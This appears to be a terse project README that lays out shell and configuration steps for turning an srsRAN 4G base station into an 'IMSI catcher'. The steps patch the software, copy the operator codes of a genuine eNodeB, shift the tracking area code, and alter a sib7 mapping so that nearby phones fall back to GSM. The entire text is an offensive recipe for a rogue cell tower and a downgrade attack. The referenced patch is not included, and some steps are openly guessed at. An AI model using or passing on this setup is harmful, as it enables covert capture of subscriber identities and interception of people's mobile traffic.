# srsran_4G_RTE
```bash
IMSI catcher reloaded
Tested on srsran_4G checkout 921f17484e0714f167d48cfe33b0a94ae569c533
patch -p1 < redir.patch
cp sib.conf /root/.config/srsran/sib.conf
nano /root/.config/srsran/enb.conf (<= mcc mnc same as genuine eNodeB)
nano /root/.config/srsran/epc.conf (<= mcc mnc same as genuine eNodeB, TAC +/-1 than genuine eNodeB)
nano /root/.config/srsran/rr.conf (<= TAC same as epc.conf)
Set an IMSI listening on arfcn 871
run srsepc,srsenb
Wait... then f(android_version or idk what) ping pong 5G-NSA <-> GSM or stay from 5G-NSA in GSM

or
change this in sib7 in sib.conf yes this ! it should do the job for ping pong to gsm at least
<             si_mapping_info = [ 3 ];
---
>             si_mapping_info = [ 7 ];

```
